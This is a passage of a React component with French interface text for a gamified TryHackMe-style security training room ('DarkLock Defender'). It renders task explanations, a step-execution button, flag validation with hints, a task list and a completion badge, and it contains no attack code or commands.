            <div className="text-xs text-slate-300 bg-slate-950/80 p-4 rounded-2xl border border-slate-800/80 leading-relaxed space-y-2 mb-6">
              <div className="flex items-center gap-1.5 text-blue-400 font-bold uppercase tracking-wider text-[10px]">
                <Info size={13} />
                <span>Explication Technique du Processus</span>
              </div>
              <p>{currentTask.theory}</p>
            </div>

            {/* BOUTON D'ACTION MANUELLE : Exécuter l'étape en direct */}
            <div className="mb-6">
              <button
                onClick={handleExecuteStep}
                disabled={isExecuting}
                className={`w-full py-3.5 px-4 rounded-2xl font-bold text-xs flex items-center justify-center gap-2 shadow-lg transition-all ${
                  lastExecutedTask === currentTask.id
                    ? 'bg-slate-800 border border-slate-700 text-slate-300 hover:bg-slate-700'
                    : 'bg-gradient-to-r from-blue-600 via-indigo-600 to-blue-500 hover:from-blue-500 hover:to-indigo-500 text-white shadow-blue-600/30 active:scale-98'
                }`}
              >
                <Zap size={16} className={isExecuting ? 'animate-bounce' : 'text-amber-400'} />
                <span>
                  {isExecuting
                    ? 'Animation en cours sur le réseau...'
                    : lastExecutedTask === currentTask.id
                    ? 'Ré-exécuter l\'action en direct'
                    : '🚀 Exécuter cette étape manuellement'}
                </span>
              </button>
            </div>

            {/* QUESTION DE FLAG TRYHACKME */}
            <div className="pt-4 border-t border-slate-800">
              <div className="flex items-center justify-between mb-2">
                <span className="text-xs font-bold text-white flex items-center gap-1.5">
                  <HelpCircle size={14} className="text-amber-400" />
                  <span>Validation du Flag TryHackMe</span>
                </span>
                <span className="text-[10px] font-mono text-emerald-400 font-bold bg-emerald-950/50 px-2 py-0.5 rounded border border-emerald-500/30">
                  +100 XP
                </span>
              </div>

              <p className="text-xs text-slate-300 font-medium mb-3">
                {currentTask.question}
              </p>

              {completedTasks[currentTask.id] ? (
                <div className="p-3 rounded-xl bg-emerald-950/70 border border-emerald-500/60 text-emerald-300 text-xs font-bold flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <CheckCircle2 size={16} className="text-emerald-400" />
                    <span>Tâche Validée ! Drapeau : {currentTask.answer}</span>
                  </div>
                  <span className="text-[10px] font-mono text-emerald-400">+100 pts</span>
                </div>
              ) : (
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <input
                      type="text"
                      value={userAnswer}
                      onChange={(e) => {
                        setUserAnswer(e.target.value)
                        setAnswerFeedback(null)
                      }}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter') handleValidateAnswer()
                      }}
                      placeholder="Tapez votre réponse ici..."
                      className="flex-1 px-3.5 py-2.5 rounded-xl bg-slate-950 border border-slate-700 text-xs text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 font-mono"
                    />
                    <button
                      onClick={handleValidateAnswer}
                      className="px-4 py-2.5 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs shadow-md shadow-emerald-600/30 transition flex items-center gap-1.5"
                    >
                      <Send size={13} />
                      <span>Valider</span>
                    </button>
                  </div>

                  {/* Feedback de réponse */}
                  {answerFeedback === 'wrong' && (
                    <p className="text-xs text-rose-400 font-medium flex items-center gap-1">
                      ❌ Réponse incorrecte. Essayez encore ou consultez l'indice !
                    </p>
                  )}

                  <div className="flex items-center justify-between text-[11px] pt-1">
                    <button
                      onClick={() => setShowHint((prev) => !prev)}
                      className="text-amber-400 hover:underline flex items-center gap-1"
                    >
                      💡 {showHint ? 'Masquer l\'indice' : 'Besoin d\'un indice ?'}
                    </button>
                  </div>

                  {showHint && (
                    <div className="p-2.5 rounded-lg bg-amber-950/40 border border-amber-500/30 text-amber-200 text-xs mt-2">
                      {currentTask.hint}
                    </div>
                  )}
                </div>
              )}
            </div>
          </div>

          {/* LISTE DES 6 TÂCHES EN ACCORDÉON / VUE D'ENSEMBLE */}
          <div className="p-4 rounded-3xl bg-slate-900 border border-slate-800 shadow-xl space-y-1.5">
            <span className="text-[11px] font-mono text-slate-400 font-bold uppercase px-2 mb-2 block">
              Toutes les Tâches de la Salle
            </span>
            {tasks.map((t, idx) => {
              const isDone = completedTasks[t.id]
              const isCurrent = activeTaskId === idx
              return (
                <div
                  key={t.id}
                  onClick={() => {
                    sound.playClick()
                    setActiveTaskId(idx)
                    setUserAnswer('')
                    setAnswerFeedback(null)
                    setShowHint(false)
                  }}
                  className={`px-3 py-2 rounded-xl text-xs flex items-center justify-between cursor-pointer transition ${
                    isCurrent
                      ? 'bg-blue-600 text-white font-bold shadow-md shadow-blue-600/30'
                      : isDone
                      ? 'bg-emerald-950/30 text-emerald-300 border border-emerald-500/20'
                      : 'hover:bg-slate-800 text-slate-400 hover:text-white'
                  }`}
                >
                  <div className="flex items-center gap-2 truncate">
                    {isDone ? (
                      <CheckCircle2 size={14} className="text-emerald-400 shrink-0" />
                    ) : (
                      <span className="w-3.5 h-3.5 rounded-full border border-slate-600 shrink-0" />
                    )}
                    <span className="truncate">{t.title}</span>
                  </div>
                  <ChevronRight size={14} className="shrink-0 opacity-60" />
                </div>
              )
            })}
          </div>
        </div>
      </div>

      {/* 4. MODAL DE CÉLÉBRATION LORSQU'ON A COMPLÉTÉ LES 6 TÂCHES (100%) */}
      {totalCompleted === tasks.length && (
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          className="mt-8 p-6 rounded-3xl bg-gradient-to-r from-emerald-950/80 via-slate-900 to-indigo-950/80 border border-emerald-500/60 shadow-2xl flex flex-col md:flex-row items-center justify-between gap-6"
        >
          <div className="flex items-center gap-4">
            <div className="w-16 h-16 rounded-2xl bg-emerald-500/20 text-emerald-400 border border-emerald-500/40 flex items-center justify-center text-3xl font-black shrink-0">
              🏆
            </div>
            <div>
              <span className="px-2.5 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 text-[10px] font-mono font-bold uppercase">
                Salle Complétée à 100%
              </span>
              <h3 className="text-xl font-black text-white mt-1">
                Félicitations ! Badge "DarkLock Defender Master" Débloqué !
              </h3>
              <p className="text-xs text-slate-300 mt-1">
                Vous avez exécuté manuellement l'intégralité de la chaîne d'attaque et de défense avec succès. Score parfait : 600 / 600 XP !
              </p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            <Link
              to="/quiz"
              onClick={() => sound.playSuccess()}
              className="px-5 py-3 rounded-2xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-xs shadow-lg shadow-emerald-600/30 flex items-center gap-2 transition"
            >
              <span>Passer au Grand Quiz Final</span>
              <ArrowRight size={15} />
            </Link>
          </div>
        </motion.div>
      )}
    </div>
  )
}

